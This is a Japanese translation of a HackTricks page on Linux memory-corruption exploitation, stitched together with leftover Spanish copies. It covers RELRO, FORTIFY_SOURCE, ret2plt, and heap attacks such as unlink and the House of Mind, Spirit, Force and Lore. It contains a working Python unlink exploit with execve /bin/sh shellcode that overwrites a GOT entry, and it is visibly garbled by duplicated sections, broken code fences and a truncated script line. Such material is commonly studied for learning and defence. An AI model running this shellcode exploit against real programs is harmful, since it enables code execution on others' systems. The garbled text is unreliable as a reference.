0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
リロなし：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
バイナリの**relroなし**の場合、`fgets`の`got`エントリのアドレスは`0x404018`であることがわかります。メモリマッピングを見ると、これは`0x404000`と`0x405000`の間にあり、**`rw`の権限**を持っていることがわかります。つまり、読み書きが可能です。一方、**relroあり**のバイナリでは、バイナリの実行時の`got`テーブルのアドレス（pieが有効なので、このアドレスは変わります）は`0x555555557fd0`です。このバイナリのメモリマッピングでは、`0x0000555555557000`と`0x0000555555558000`の間にあり、メモリの**権限は`r`**であり、読み取りのみが可能です。

では、**回避方法**は何でしょうか？私が通常使用する回避方法は、relroによって読み取り専用になるメモリ領域に書き込まず、**別の方法でコード実行を行う**ことです。

なお、これを実現するためには、バイナリが実行前に関数のアドレスを事前に知っている必要があります。

* 遅延バインディング：関数のアドレスは、関数が初めて呼び出されるときに検索されます。したがって、実行中にGOTに書き込み権限が必要です。
* すぐにバインド：関数のアドレスは実行の初めに解決され、その後、.got、.dtors、.ctors、.dynamic、.jcrなどの重要なセクションに読み取り専用の権限が与えられます。`` `** ``-z relro`**`y`**`-z now\`\*\*

プログラムがすぐにバインドを使用しているかどうかを確認するには、次のコマンドを実行します。
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
## exploiting/linux-exploiting-basic-esp/README.md

```markdown
バイナリがメモリにロードされ、関数が初めて呼び出されると、PLT（Procedure Linkage Table）にジャンプし、GOTにジャンプしてそのエントリが解決されていないことを確認します（PLTの次のアドレスを含んでいます）。そのため、ランタイムリンカまたはrtfdを呼び出してアドレスを解決し、GOTに保存します。

関数が呼び出されると、PLTが呼び出され、関数のアドレスが格納されているGOTのアドレスにフローがリダイレクトされ、関数が呼び出されます。ただし、関数が初めて呼び出される場合、GOTにはPLTの次の命令が格納されているため、フローはPLTのコード（rtfd）に従い、関数のアドレスを取得し、GOTに保存して呼び出します。

バイナリをメモリにロードすると、コンパイラはプログラムを実行する際にロードする必要のあるデータのオフセットを指示します。

遅延バインディング（Lazy binding）—> 関数のアドレスは、その関数が初めて呼び出されるときに検索されるため、GOTは書き込み許可があり、検索時にそこに保存され、再度検索する必要がありません。

即時バインディング（Bind now）—> プログラムのロード時に関数のアドレスが検索され、.got、.dtors、.ctors、.dynamic、.jcrセクションのパーミッションが読み取り専用に変更されます。**-z relro** および **-z now**

しかし、一般的にプログラムはこれらのオプションで複雑になっていないため、これらの攻撃は依然として可能です。

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** —> BIND NOW を使用しているかどうかを確認するためのコマンド

**Fortify Source -D_FORTIFY_SOURCE=1 or =2**

安全でないコピー関数を特定し、安全な関数に置き換えます。

例：\
char buf[16];\
strcpy(but, source);

これを安全ではないとして特定し、strcpy() を \_\_strcpy\_chk() に置き換えます。バッファのサイズを最大コピーサイズとして使用します。

**=1** と **=2** の違いは次のとおりです：

後者は、**%n** が書き込み許可のあるセクションから来ないようにします。また、引数の直接アクセスパラメータは、前述のものを使用している場合にのみ使用できます。つまり、**%2$d** と **%1$d** を使用した後にのみ **%3$d** を使用できます。

エラーメッセージを表示するためには、argv\[0\] を使用します。そのため、他の場所（グローバル変数など）のアドレスをargv\[0\] に設定すると、エラーメッセージにその変数の内容が表示されます。ページ 191

**Libsafe の置き換え**

次のように有効にします： LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

いくつかの安全でない関数呼び出しを安全な関数呼び出しに置き換えます。標準化されていません（x86 のみ、-fomit-frame-pointer でのコンパイル、静的コンパイル、すべての脆弱な関数が安全になるわけではなく、LD\_PRELOAD は setuid バイナリでは機能しません）。

**ASCII Armored Address Space**

共有ライブラリを0x00000000 から 0x00ffffff までロードすることで、常に0x00 のバイトが存在するようにします。ただし、これはほとんどの攻撃を防ぐことはできず、特にリトルエンディアンでは効果がありません。

**ret2plt**

ROP を実行し、strcpy@plt（plt の関数）を呼び出し、GOT のエントリを指し、呼び出したい関数（system()）の最初のバイトをコピーします。その後、GOT+1 を指し、system() の2番目のバイトをコピーします... 最後に、GOT に保存されたアドレス（system()）を呼び出します。

**Fake EBP**

EBP を引数を指すレジスタとして使用する関数では、EIP を変更して system() を指すようにするために、EBP も変更する必要があります。EBP をメモリ領域に指すように変更し、任意の2バイトを持つメモリ領域の後に &”/bin/sh” のアドレスを指すようにします。

**chroot() によるジェイル**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします

管理者は、mkdir foo; chroot foo; cd .. を実行することで、これらのジェイルから抜け出すことができます。

**コードインストゥルメンテーション**

Valgrind —> エラーを検出します\
Memcheck\
RAD（Return Address Defender）\
Insure++

## **8 Heap Overflows: Exploits básicos**

**割り当てられたチャンク**

prev\_size |\
size | —ヘッダー\
\*mem | データ

**フリーチャンク**

prev\_size |\
size |\
\*fd | フォワードチャンクへのポインタ\
\*bk | バックチャンクへのポインタ —ヘッダー\
\*mem | データ

フリーチャンクは、ダブルリンクリスト（bin）にあり、2つのフリーチャンクが連続して存在することはありません（結合されます）。

「size」には、前のチャンクが使用中であるか、mmap() によって割り当てられたか、プライマリアリーナに属しているかを示すビットがあります。

チャンクを解放すると、隣接するチャンクがフリーであれば、unlink() マクロを使用してそれらを結合し、最大の新しいチャンクをfrontlink() に渡して適切な bin に挿入します。

unlink(){\
BK = P->bk; —> 新しいチャンクの BK は以前にフリーだったものの BK です\
FD = P->fd; —> 新しいチャンクの FD は以前にフリーだったものの FD です\
FD->bk = BK; —> 次のチャンクの BK は新しいチャンクを指します\
BK->fd = FD; —> 前のチャンクの FD は新しいチャンクを指します\
}

したがって、P->bk をシェルコードのアドレスに、P->fd をGOTまたはDTORSのエントリのアドレスから12引いたアドレスに変更することで、次のことが実現できます：

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

そして、プログラムの終了時にシェルコードが実行されます。

さらに、unlink() の4番目の文は何かを書き込むため、シェルコードはこれに対応する必要があります
## exploiting/linux-exploiting-basic-esp/README.md

```markdown
Después de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que está libre) y “-4“(0xfffffffc) en el size (para que cuando compruebe en el 3º trozo si el 2º estaba libre en realidad vaya al prev\_size modificado que le dirá que s´está libre) -> Así cuando free() investigue irá al size del 3º pero en realidad irá al 2º - 4 y pensará que el 2º trozo está libre. Y entonces llamará a **unlink()**.

Al llamar a unlink() usará como P->fd los primeros datos del 2º trozo por lo que ahí se meterá la dirección que se quieres sobreescribir - 12(pues en FD->bk le sumará 12 a la dirección guardada en FD) . Y en esa dirección introducirá la segunda dirección que encuentre en el 2º trozo, que nos interesará que sea la dirección a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev\_size) pues es ahí donde mira si el 2º trozo está libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Dirección de free() en la plt-12 (será la dirección que se sobrescrita para que se lanza la shellcode la 2º vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sí**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2º trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a está libre.

Además, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensará que “a” está libre y en un bin, por lo que llamará a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensará que el trozo de “a” realmente empieza en b+4. Es decir, hará un unlink() a un trozo que comienza en b+4, por lo que en b+12 estará el puntero “fd” y en b+16 estará el puntero “bk”.

De esta forma, si en bk ponemos la dirección a la shellcode y en fd ponemos la dirección a la función “puts()”-12 tenemos nuestro payload.

**Técnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad útil cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la función de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificará el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tamaño mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma dirección.

En caso de querer volver a usar uno se asignaría sin problemas. En caso de querer usar otro, se le asignaría el mismo espacio por lo que tendríamos los punteros “fd” y “bk” falseados con los datos que escribirá la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las técnicas de Unlink() y FrontLink() fueron eliminadas al modificar la función unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecución de código arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Devuelve un puntero a la dirección donde comienza el trozo (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobación devuelva true y ejecute heap\_for\_ptr() que hace un and a “mem” dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)
```

```html
## exploiting/linux-exploiting-basic-esp/README.md

```markdown
シェルコードの後には、次のチャンクのprev\_sizeとsizeフィールドに到達するまでパディングを挿入します。これらの場所には、prev\_sizeがフリーであることを示すビットを持つように0xfffffff0を挿入し、sizeには「-4」（0xfffffffc）を挿入します（2番目のチャンクが実際にフリーであるかどうかを確認するために3番目のチャンクでチェックするとき、実際には変更されたprev\_sizeに移動し、2番目のチャンクがフリーであると判断します）。したがって、free()が調査するときには、実際には3番目のサイズに移動しますが、実際には2番目のサイズ-4に移動し、2番目のチャンクがフリーであると思います。そして、それから**unlink()**を呼び出します。

unlink()を呼び出すと、P->fdとして2番目のチャンクの最初のデータが使用されるため、そこに上書きしたいアドレスが入ります-12（FD->bkに保存されたアドレスに12を加算します）。そして、そのアドレスには2番目のチャンクで見つかる2番目のアドレスが入ります。これはシェルコードのアドレス（P->bk偽）にしたいです。

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #前のチャンクがフリーであることを示すビットが1であることが重要です**

**fake\_size = pack("\<I”, 0xfffffffc) #-4、2番目のチャンクがフリーであるかどうかを確認する場所（prev\_sizeを指している）が4バイト後ろにあると思わせるため**

**addr\_sc = pack("\
この方法では、例えば0x0804a000の領域を制御し、0x081002a0の領域が解放されると、0x08100000のアドレスに自由に書き込むことができます。例えば、0x0804a000を書き込むことができます。この2番目の領域が解放されると、heap_for_ptr(ptr)->ar_ptrは0x08100000に書き込んだ内容を返します（0x081002a0に適用されるand演算から最初の4バイトの値、ar_ptrが取得されます）。

このように、\_int_free(ar_ptr, mem)が呼び出されます。つまり、\_int_free(0x0804a000, 0x081002a0)です。

\_int_free(mstate av, Void_t* mem){
…
bck = unsorted_chunks(av);
fwd = bck->fd;
p->bk = bck;
p->fd = fwd;
bck->fd = p;
fwd->bk = p;
}

前述のように、avの値を制御できることがわかります。なぜなら、解放される領域に書き込むからです。

unsorted_chunksがどのように定義されているかを考えると、次のようになります。
bck = &av->bins[2]-8;
fwd = bck->fd = *(av->bins[2]);
fwd->bk = *(av->bins[2] + 12) = p;

したがって、av->bins[2]に\_\_DTOR\_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR\_END\_\_のアドレスが2番目の領域のアドレスに書き込まれます。

つまり、最初の領域の先頭には何度も\_\_DTOR\_END\_\_-12のアドレスを書き込む必要があります。なぜなら、av->bins[2]からそれを取得するからです。

2番目の領域のアドレスには、最後の5桁がすべて0のアドレスに、最初の領域へのアドレスを書き込む必要があります。そうすることで、heap_for_ptr()はar_ptrが最初の領域の先頭にあると思い込み、av->bins[2]から値を取得します。

2番目の領域では、最初の領域を使用してprev_sizeをジャンプ0x0cで上書きし、sizeにはNON_MAIN_ARENAを有効にするための値を書き込みます。

次に、2番目の領域には大量のnopsを配置し、最後にシェルコードを配置します。

このようにして、\_int_free(TROZO1, TROZO2)が呼び出され、\_\_DTOR\_END\_\_のprev_sizeのアドレスがTROZO2に書き込まれ、そこからシェルコードにジャンプします。

このテクニックを適用するには、いくつかの追加の要件を満たす必要があり、ペイロードがやや複雑になります。

このテクニックはもはや適用できません。unlinkとほぼ同じパッチが適用されました。新しい場所が自身を指しているかどうかを比較します。

**Fastbin**

The house of mindのバリエーションです。

\_int\_free()関数の最初のチェックを通過した後に実行される次のコードを実行することが重要です。

fb = &(av->fastbins[fastbin_index(size)] —> fastbin_index(sz) —> (sz >> 3) - 2

…

p->fd = *fb

*fb = p

これにより、fbがGOT内の関数のアドレスを指すようになります。このアドレスには、上書きされる領域のアドレスが配置されます。これには、av->max_fastが書き込まれるアドレスが近くにある必要があります。

The House of Mindでavの位置を制御できることがわかりました。

したがって、sizeフィールドに8 + NON_MAIN_ARENA + PREV_INUSEのサイズを設定すると、fastbin_index()はfastbins[-1]を返し、これはav->max_fastを指します。

この場合、av->max_fastは上書きされるアドレスです（指すアドレスではなく、その位置が上書きされます）。

さらに、解放される隣接領域のサイズは8より大きくなければなりません。解放される領域のサイズが8であると述べたので、この偽の領域には8より大きいサイズを設定するだけです（さらに、シェルコードが解放される領域に配置されるため、最初にjmpが配置される必要があります）。

さらに、同じ偽の領域はav->system_memよりも小さくなければなりません。av->system_memはその上に1848バイトあります。

\_DTOR_END\_のヌル文字とGOT内のアドレスの数が少ないため、これらのセクションのどのアドレスも上書きには使用できません。そのため、fastbinを使用してスタックを攻撃する方法を見てみましょう。

もう一つの攻撃方法は、avをスタックに向けることです。

サイズを8ではなく16に変更すると、fastbin_index()はfastbins[0]を返し、これを使用してスタックを上書きできます。

そのため、スタックにはcanaryや奇妙な値がない必要があります。実際、以下のような状態である必要があります：4バイトのヌル文字 + EBP + RET

4バイトのヌル文字は、avがこのアドレスを指し、avの最初の要素であるmutexeが0である必要があります。

av->max_fastはEBPとなり、制約をスキップするための値となります。

av->fastbins[0]はpのアドレスで上書きされ、RETとなり、シェルコードにジャンプします。

さらに、av->system_mem（スタック上の位置から1484バイト上にある）には、スキップするための十分なゴミがあります。

解放される隣接領域のサイズは8より大きくなければなりません。解放される領域のサイズが16であると述べたので、この偽の領域には8より大きいサイズを設定するだけです（さらに、新しい偽の領域のsizeフィールドの後に配置されるnopsにジャンプするjmpが配置される必要があります）。

**The House of Spirit**

この場合、攻撃者が変更できるmallocへのポインタ（例：オーバーフロー可能な変数の下にあるスタック上のポインタ）を持つ必要があります。

したがって、このポインタを任意の場所に指すことができます。ただし、任意の場所が有効であるわけではありません。偽の領域のサイズはav->max_fastよりも小さくなければならず、より具体的には将来のmalloc()+8の呼び出しで要求されるサイズと同じでなければなりません。したがって、この脆弱なポインタの後にmalloc(40)が呼び出されることがわかっている場合、偽の領域のサイズは48とする必要があります。
**The House of Force**

例えば、プログラムがユーザーに数値を尋ねる場合、48を入力し、変更可能なmallocのポインタを次の4バイトに設定することができます（これは幸運な場合、EBPに属するかもしれませんので、48は後ろに残ります）。さらに、ptr-4+48のアドレスはいくつかの条件を満たす必要があります（この場合、ptr=EBPであるとします）、つまり、8 < ptr-4+48 < av->system_memです。

これが満たされる場合、次にmallocが呼び出されると、malloc(40)と指定した場合、そのアドレスにEBPのアドレスが割り当てられます。攻撃者がこのmallocに書き込むこともできる場合、EBPとEIPの両方を任意のアドレスに上書きすることができます。

これは、free()が呼び出されたときに、スタックのEBPを指すアドレスに新しいmalloc()のための完璧なサイズのチャンクがあることを保存するためです。したがって、そのアドレスが割り当てられます。

**The House of Lore**

**SmallBinの破損**

解放されたチャンクは、サイズに基づいてbinに挿入されます。ただし、binに挿入される前に、unsorted binsに保存されます。チャンクが解放されると、すぐにbinに入れるのではなく、unsorted binsに残ります。次に、新しいチャンクが予約され、前の解放されたチャンクが使用できる場合はそれを返しますが、より大きなチャンクが予約されると、unsorted binsにある解放されたチャンクは適切なbinに入れられます。

脆弱なコードに到達するためには、メモリの要求がav->max_fast（通常72）より大きく、MIN_LARGE_SIZE（512）より小さい必要があります。

binに適切なサイズのチャンクがある場合、それを解除した後にそれを返します：

bck = victim->bk; 前のチャンクを指します。これが攻撃者が変更できる唯一の情報です。

bin->bk = bck; ペンultimateなチャンクが最後になります。bckがスタックを指している場合、次に予約されるチャンクにこのアドレスが与えられます。

bck->fd = bin; このリストを閉じるために、これがbinを指すようにします。

必要なもの：

2つのmallocを予約する必要があります。2番目のmallocが解放され、そのbinに挿入された後に最初のmallocにオーバーフローを行うことができるようにします（つまり、オーバーフローする前に2番目のチャンクよりも大きなmallocが予約されます）。

攻撃者が選んだアドレスを持つ予約されたmallocが攻撃者によって制御される必要があります。

目標は次のとおりです。解放されたヒープにオーバーフローを行うことができる場合、そのヒープのbkポインタを変更する必要があります。bkポインタを変更し、そのチャンクがbinのリストの最初になり、予約される場合、binは偽のアドレス（スタックやGOTなど）に次のリストの最後のチャンクがあると信じ込まされます。したがって、もう1つのチャンクが予約され、攻撃者がそのチャンクにアクセス権を持っている場合、望ましい位置にチャンクが与えられ、書き込むことができます。

変更されたチャンクを解放した後、解放されたチャンクよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクはunsorted binsから出て、適切なbinに入れられます。

binに入った後、オーバーフローを使用してbkポインタを変更し、上書きするアドレスを指すようにします。

したがって、binは、十分な回数のmalloc()呼び出しが行われるまで待つ必要があります。変更されたbinを再度使用し、次のチャンクが偽のアドレスにあるとbinを騙し、望ましいチャンクを与えます。

この攻撃をできるだけ早く実行するためには、次のような理想的な順序で行う必要があります。脆弱なチャンクの予約、変更されるチャンクの予約、このチャンクの解放、変更されるチャンクよりも大きなチャンクの予約、チャンクの変更（脆弱性）、脆弱なチャンクと同じサイズのチャンクの予約、および2番目のチャンクと同じサイズのチャンクの予約。2番目のチャンクが選択したアドレスを指すことになります。

この攻撃を防ぐために、通常のチェックが使用されます。つまり、チャンクが「偽」でないことを確認します。つまり、bck->fdがvictimを指しているかどうかを確認します。つまり、私たちの場合、スタックに指された偽のチャンクのfdポインタがvictimを指しているかどうかを確認します。この保護を回避するには、攻撃者はどうかの方法で（おそらくスタックを介して）適切なアドレスにvictimのアドレスを書き込む必要があります。これにより、それが本物のチャンクであるかのように見えます。

**LargeBinの破損**

前述の要件に加えて、予約されるチャンクのサイズは512より大きくする必要があります。

攻撃は前と同じですが、変更されたチャンクのサイズを変更する必要があります。つまり、そのサイズ - nbがMINSIZEより小さくなるように変更する必要があります。

例えば、サイズを1552に設定すると、1552 - 1544 = 8 < MINSIZE（負になることはありません、unsignedを比較しているため）。

さらに、これをより困難にするためにパッチが導入されました。

**Heap Spraying**
基本的には、ヒープにできるだけ多くのメモリを割り当て、これらをNopで終わるシェルコードのクッションで埋めます。また、クッションとして0x0cを使用します。したがって、アドレス0x0c0c0c0cにジャンプしようとします。したがって、このクッションで呼び出されるアドレスが上書きされる場合、そこにジャンプします。基本的な戦術は、最大限の予約を行い、ポインタが上書きされるかどうかを確認し、そこにジャンプすることです。そこにはNopがあることを期待しています。

**Heap Feng Shui**

これは、予約と解放を使用してメモリをセグメント化し、空きスペースの間に予約されたスペースが残るようにするものです。オーバーフローするバッファは、これらのスペースの1つに配置されます。

**objdump -d executable** —> 関数のDisas\
**objdump -d ./PROGRAMA | grep FUNCTION** —> 関数のアドレスを取得\
**objdump -d -Mintel ./shellcodeout** —> シェルコードを確認し、OpCodeを取得するためのもの\
**objdump -t ./exec | grep varBss** —> シンボルテーブルから変数と関数のアドレスを取得するためのもの\
**objdump -TR ./exec | grep exit(func lib)** —> ライブラリの関数のアドレスを取得するためのもの (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOTに上書きするputsのアドレスを取得するためのもの\
**objdump -D ./exec** —> 全てのDisasを表示し、pltのエントリまで表示するためのもの\
**objdump -p -/exec**\
**Info functions strncmp —>** gdbで関数の情報を取得するためのもの

## おすすめのコース

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **参考文献**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションを発見してください。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
